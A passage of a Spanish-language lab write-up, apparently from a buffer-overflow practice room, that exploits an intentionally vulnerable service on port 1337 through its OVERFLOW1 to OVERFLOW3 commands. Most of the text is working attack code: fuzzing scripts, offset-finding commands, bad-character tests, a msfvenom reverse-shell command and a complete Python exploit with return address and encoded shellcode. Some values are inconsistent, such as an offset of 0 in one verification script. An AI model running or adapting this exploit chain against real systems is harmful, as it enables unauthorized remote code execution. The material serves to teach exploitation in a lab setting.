- *Crash Replication & Controlling EIP*: Ahora, vamos a desarrollar el fichero cuyo código será el exploit que utilizaremos. Empleamos el siguiente codigo Python:

```python
import socket

ip = "10.10.216.16"
port = 1337

prefix = "OVERFLOW1 "
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
s.connect((ip, port))
print("Sending evil buffer...")
s.send(bytes(buffer + "\r\n", "latin-1"))
print("Done!")
except:
print("Could not connect.")
```

Conforme vayamos completando pasos irémos variando el código anterior hasta que sea el definitivo que nos abra una reverse shell.

En primer lugar, para tomar el control del EIP necesitamos saber el offset (el byte a partir del comienzo de los datos) respecto del cual comienza el valor que luego terminará en el registro EIP. Para ello vamos a emplear la herramienta del entorno C2 Metasploit, *pattern_create*:

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2100
```

Copiamos el output y lo lanzamos con el código anterior:

```python
import socket

ip = "10.10.216.16"
port = 1337

prefix = "OVERFLOW1 "
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9"
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
s.connect((ip, port))
print("Sending evil buffer...")
s.send(bytes(buffer + "\r\n", "latin-1"))
print("Done!")
except:
print("Could not connect.")
```

Y lo lanzamos. Lo que obtenemos en el Immunity Debugger es el correspondiente crash del servicio y el patrón con el que se ha sobreescrito el EIP:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221024201819.png' | relative_url }}" text-align="center"/>
</div>

Ahora, utilizamos Mona en el Immunity Debugger para saber cuál es el offset asociado al EIP:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221024202102.png' | relative_url }}" text-align="center"/>
</div>

Obvservamos que se encuentra en el offset 1978 y esto se puede corroborar con el siguiente comando:

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 2100 -q 6f43396e
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221024202310.png' | relative_url }}" text-align="center"/>
</div>

Para demostrar esto, empleamos el siguiente código:

```python
import socket

ip = "10.10.216.16"
port = 1337

prefix = "OVERFLOW1 "
offset = 1978
overflow = "A" * offset
retn = ""
padding = ""
payload = "B" * 4
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
s.connect((ip, port))
print("Sending evil buffer...")
s.send(bytes(buffer + "\r\n", "latin-1"))
print("Done!")
except:
print("Could not connect.")
```

Al lanzarlo, obtenemos que el EIP ha sido sobreescrito con cuatro '42', con lo que efectivamente, hemos tomado control del valor del registro del EIP:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221024202759.png' | relative_url }}" text-align="center"/>
</div>

<br />

- *Finding Bad Characters and generating ShellCode*:

A continuación vamos a intentar encontrar "bad characters" para excluirlos de la generación del shell code.

Empleamos el siguiente código en Python para generar caracteres hexadecimales:

```python
for x in range(1, 256):
print("\\x" + "{:02x}".format(x), end='')
print()
```

El output del comando "*python3 badchars.py | tr -d '\\n'; echo*" lo introducimos en el código exploit.py

```python
import socket

ip = "10.10.216.16"
port = 1337

prefix = "OVERFLOW1 "
offset = 1978
overflow = "A" * offset
retn = ""
padding = ""
payload = "B" * 4
postfix ="\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
s.connect((ip, port))
print("Sending evil buffer...")
s.send(bytes(buffer + "\r\n", "latin-1"))
print("Done!")
except:
print("Could not connect.")
```

Y lo enviamos al programa. Una vez enviado, examinamos el Hexdump después del valor del registro del EIP, el ESP:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221025103342.png' | relative_url }}" text-align="center"/>
</div>

Podemos observar en la imagen que los bytes \\x07, \\x08, \\x2E, \\x2F, \\xA0, \\xA1. *Esto no significa que todos estos bytes sean de hecho "badcharacters", algunos badcharacters hacen que el byte siguiente se corrompa pero para evitar problemas descartaremos todos ellos*.

De esta forma, el comando a utilizar para generar el shellcode sería el siguiente:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<YOUR_IP> LPORT=4444 EXITFUNC=thread -b "\x00,\x07,\x08,\x2E,\x2F,\xA0,\xA1" -f c
```

Este nos devolverá un output que debemos colocar en la variable Payload de nuestro exploit.py.

<br />

- *Finding a Jump Point*:

Ahora, todo lo que queda es encontrar un punto de salto, es decir, una instrucción que incluya una librería en la que incluir nuestro código malicioso. Para ello empleamos el siguiente comando en Immunity Debugger: *!mona jmp -r esp -cpb "\\x00\\x07\\x08\\x2E\\x2F\\xA0\\xA1"*

Este identificará todas las instrucciones jmp esp y nos devolverá los punteros que apuntan a la dirección de memoria sobre la que se produce el salto al ESP.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221025114207.png' | relative_url }}" text-align="center"/>
</div>

Podemos observar que todas las direcciones están sin protección de memoria y apuntan a una libreria llamada essfunc.dll. De esta forma, acudimos a nuestro exploit.py seteamos la variable 'retn' con una de las direcciones colocada con los bytes alrevés. En nuestro caso, la dirección escogida es 625011af:

```python
import socket

ip = "10.10.216.16"
port = 1337

prefix = "OVERFLOW1 "
offset = 1978
overflow = "A" * offset
retn = "\xaf\x11\x50\x62"
padding = "\x90" * 16
payload = ("\xb8\xba\xd9\x8e\xe8\xda\xcb\xd9\x74\x24\xf4\x5b\x29\xc9\xb1"
"\x52\x31\x43\x12\x83\xeb\xfc\x03\xf9\xd7\x6c\x1d\x01\x0f\xf2"
"\xde\xf9\xd0\x93\x57\x1c\xe1\x93\x0c\x55\x52\x24\x46\x3b\x5f"
"\xcf\x0a\xaf\xd4\xbd\x82\xc0\x5d\x0b\xf5\xef\x5e\x20\xc5\x6e"
"\xdd\x3b\x1a\x50\xdc\xf3\x6f\x91\x19\xe9\x82\xc3\xf2\x65\x30"
"\xf3\x77\x33\x89\x78\xcb\xd5\x89\x9d\x9c\xd4\xb8\x30\x96\x8e"
"\x1a\xb3\x7b\xbb\x12\xab\x98\x86\xed\x40\x6a\x7c\xec\x80\xa2"
"\x7d\x43\xed\x0a\x8c\x9d\x2a\xac\x6f\xe8\x42\xce\x12\xeb\x91"
"\xac\xc8\x7e\x01\x16\x9a\xd9\xed\xa6\x4f\xbf\x66\xa4\x24\xcb"
"\x20\xa9\xbb\x18\x5b\xd5\x30\x9f\x8b\x5f\x02\x84\x0f\x3b\xd0"
"\xa5\x16\xe1\xb7\xda\x48\x4a\x67\x7f\x03\x67\x7c\xf2\x4e\xe0"
"\xb1\x3f\x70\xf0\xdd\x48\x03\xc2\x42\xe3\x8b\x6e\x0a\x2d\x4c"
"\x90\x21\x89\xc2\x6f\xca\xea\xcb\xab\x9e\xba\x63\x1d\x9f\x50"
"\x73\xa2\x4a\xf6\x23\x0c\x25\xb7\x93\xec\x95\x5f\xf9\xe2\xca"
"\x40\x02\x29\x63\xea\xf9\xba\x86\xe1\x18\x12\xff\xf7\x1a\x75"
"\xa3\x7e\xfc\x1f\x4b\xd7\x57\x88\xf2\x72\x23\x29\xfa\xa8\x4e"
"\x69\x70\x5f\xaf\x24\x71\x2a\xa3\xd1\x71\x61\x99\x74\x8d\x5f"
"\xb5\x1b\x1c\x04\x45\x55\x3d\x93\x12\x32\xf3\xea\xf6\xae\xaa"
"\x44\xe4\x32\x2a\xae\xac\xe8\x8f\x31\x2d\x7c\xab\x15\x3d\xb8"
"\x34\x12\x69\x14\x63\xcc\xc7\xd2\xdd\xbe\xb1\x8c\xb2\x68\x55"
"\x48\xf9\xaa\x23\x55\xd4\x5c\xcb\xe4\x81\x18\xf4\xc9\x45\xad"
"\x8d\x37\xf6\x52\x44\xfc\x16\xb1\x4c\x09\xbf\x6c\x05\xb0\xa2"
"\x8e\xf0\xf7\xda\x0c\xf0\x87\x18\x0c\x71\x8d\x65\x8a\x6a\xff"
"\xf6\x7f\x8c\xac\xf7\x55")
postfix =""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
s.connect(('<ip>', 1337))
print("Sending evil buffer...")
s.send(bytes(buffer + "\r\n", "latin-1"))
print("Done!")
except:
print("Could not connect.")
```

Debemos recordar que el padding es un espacio en bytes que se pone entre el data del oferflow y el payload para garantizar un correcto funcionamiento del dispositivo.

**Así, en definitiva este código se conectará al servicio y mandará el comando OVERFLOW1 junto con un data que desbodará el BufferSpace (overflow) y sobreescribirá el valor del EIP (retn) para hacer que el procesador salte a la dirección de memoria del registro ESP que habrá quedado inmediatamente sobreescrita por nuestro código de la shellcode (payload) provocando su ejecución.**

<br />

- *Exploit*:

Abrimos un listener en netcat en el puerto 4444 y lanzamos el exploit ejecutando el script de python:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221025115540.png' | relative_url }}" text-align="center"/>
</div>

<br />

**OVERFLOW2**

Vamos a repetir todo el proceso con el comando OVERFLOW2.

- *Fuzzing*: En la etapa de Fuzzing tratamos de medir cuántos bytes hacen crashear un comando vulnerable del servicio.

Reutilizando el código anterior:

```python
import socket, time, sys

ip = "10.10.216.16"

port = 1337
timeout = 5
prefix = "OVERFLOW2 "

string = prefix + "A" * 100

while True:
try:
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
s.settimeout(timeout)
s.connect((ip, port))
s.recv(1024)
print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
s.send(bytes(string, "latin-1"))
s.recv(1024)
except:
print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
sys.exit(0)
string += 100 * "A"
time.sleep(1)
```

Comenzamos el fuzzeo y obtenermos que el crasheo se produce alrededor de los 700 bytes. Al observar la pantalla de Immunity Debugger observamos que el EIP ha quedado sobreescrito y por tanto el crasheo se ha producido por un desbordamiento del buffer, con lo que el parámetro es vulnerable.

- *Catching the offset*: Ahora, procedemos a calcular el offset del EIP para tomar control del contenido del mismo. Desarrollamos un patrón de 800 bytes con el siguiente comando:

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 800
```

E incluimos el resultado en el siguiente código del exploit.py en la variable payload:

```python
import socket

ip = "10.10.216.16"
port = 1337

prefix = "OVERFLOW2 "
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
s.connect((ip, port))
print("Sending evil buffer...")
s.send(bytes(buffer + "\r\n", "latin-1"))
print("Done!")
except:
print("Could not connect.")
```

Lo lanzamos contra el programa que crashea y observamos a través de Immunity Debugger que el EIP ha quedado sobreescrito con el término, 76413176. El siguiente comando

```bash
usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 800 -q 76413176
```

Que el offset concreto es el 634.

Para probarlo, modificamos el código anteiror para que quede de la siguiente manera

```python
import socket

ip = "10.10.216.16"
port = 1337

prefix = "OVERFLOW2 "
offset = 634
overflow = "A" * offset
retn = ""
padding = ""
payload = "B"*4
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
s.connect((ip, port))
print("Sending evil buffer...")
s.send(bytes(buffer + "\r\n", "latin-1"))
print("Done!")
except:
print("Could not connect.")
```

Al lanzarlo contra el programa comprobamos que el EIP queda sobreescrito por cuatro '42' (B en Hexadecimal) con lo que efectivamente hemos tomado control del valor del EIP.

<br />

- *Badcharacters*:

Creamos un string de characteres en hexadecimal con el siguiente código en Python:

```python
for x in range(1, 256):
print("\\x" + "{:02x}".format(x), end='')
print()
```

Que empleamos en el siguiente comando: python3 badchars.py | tr -d '\\n'; echo para que salga ordenado. Después incluimos el string que nos da el comando en exploit.py después del EIP (es decir, en una variable que vaya después del payload), por ejemplo "Postfix":

```python
import socket

ip = "10.10.216.16"
port = 1337

prefix = "OVERFLOW2 "
offset = 634
overflow = "A" * offset
retn = ""
padding = ""
payload = "B"*4
postfix = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
s.connect((ip, port))
print("Sending evil buffer...")
s.send(bytes(buffer + "\r\n", "latin-1"))
print("Done!")
except:
print("Could not connect.")
```

Al enviar lo, de nuevo, examinamos el Hexdump después del valor del registro EIP y examinamos los bytes: \\x00\\x23\\x83\\xBA

<br />

**OVERFLOW3**

De nuevo, esta vez nos vamos a centrar en el servicio intencionalmente vulnerable OSCP, concretamente en el comando OVERFLOW3.

- *Fuzzing*: Comenzamos con la etapa de fuzzing en la que pretendemos ver cuántos bytes aproxidamente provocan el desbordamiento del buffer. Empleamos el script:

```python
import socket, time, sys

ip = "10.10.37.115"

port = 1337
timeout = 5
prefix = "OVERFLOW3 "

string = prefix + "A" * 100

while True:
try:
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
s.settimeout(timeout)
s.connect((ip, port))
s.recv(1024)
print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
s.send(bytes(string, "latin-1"))
s.recv(1024)
except:
print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
sys.exit(0)
string += 100 * "A"
time.sleep(1)
```

Al emplear el script nos informa de que el crasheo se produce cerca de los 1300 bytes. Al observar Immunity Debugger observarmos que el registro EIP ha quedado sobreescrito y por tanto el crasheo del servicio se ha producido por el desbordamiento del buffer.

- *Catching the Offset*: Ahora, debemos obtener el offset concreto desde el cual comienza el valor que coge el registro EIP para tomar control mismo. Para ello construimos un patrón de 1500 bytes con el siguiente comando:

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1500
```

Y el resultado lo introducimos en la variable postfix del script 'exploit.py' como queda:

```python
import socket

ip = "10.10.37.115"
port = 1337

prefix = "OVERFLOW3 "
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9"

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
s.connect((ip, port))
print("Sending evil buffer...")
s.send(bytes(buffer + "\r\n", "latin-1"))
print("Done!")
except:
print("Could not connect.")
```

Al enviarlo observamos en el Immunity Debugger que el EIP ha quedado sobreescrito con el término: 71423471. De esta forma, con el comando:

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 1500 -q 3571234
```

Obtenemos que el offset concreto es 1274, para comprobarlo empleamos el siguiente script y observamos si el EIP ha quedado sobreescrito con el término '42424242':

```python
import socket

ip = "10.10.37.115"
port = 1337

prefix = "OVERFLOW3 "
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = "B"*4
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
s.connect((ip, port))
print("Sending evil buffer...")
s.send(bytes(buffer + "\r\n", "latin-1"))
print("Done!")
except:
print("Could not connect.")
```

<br />

- *Finding Bad Characters*: Ahora, generamos un string de bytes hexadecimales mediante el siguiente script:

```python
for x in range(1, 256):
print("\\x" + "{:02x}".format(x), end='')
print()
```

Incluyéndolo en el siguiente comando:

```bash
python3 badchars.py | tr -d '\\n' ; echo.
```

De esta forma, el output de el comando anterior se copia en la variable postfix del exploit.py de forma que se introduzca después de la sobreescritura del EIP (como nuestra shellcode, puesto que lo que queremos hacer con este paso es ver cómo se procesa el código de nuestra shellcode).

```python
import socket
ip = "10.10.29.130"
port = 1337
prefix = "OVERFLOW3 "
offset = 1274
overflow = "A" * offset
retn = ""
padding = ""
payload = "B"*4
postfix = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\